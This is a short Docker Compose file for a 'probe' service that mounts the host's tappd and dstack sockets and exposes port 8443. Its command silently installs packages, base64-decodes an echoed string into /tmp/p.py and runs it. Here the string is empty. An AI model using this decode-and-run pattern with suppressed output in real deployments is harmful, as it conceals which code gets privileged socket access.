services:
  probe:
    image: python@sha256:6d43704baacd1bfbe7c295d7f13079d5d8104ed33568873133f8fc69980419df
    restart: always
    ports:
      - "8443:8443"
    volumes:
      - /var/run/tappd.sock:/var/run/tappd.sock
      - /var/run/dstack.sock:/var/run/dstack.sock
    command: ["sh","-c","apk add --no-cache openssl >/dev/null 2>&1; pip install --quiet --no-cache-dir 'dstack-sdk==0.5.4' >/dev/null 2>&1; echo  | base64 -d > /tmp/p.py && python3 /tmp/p.py"]
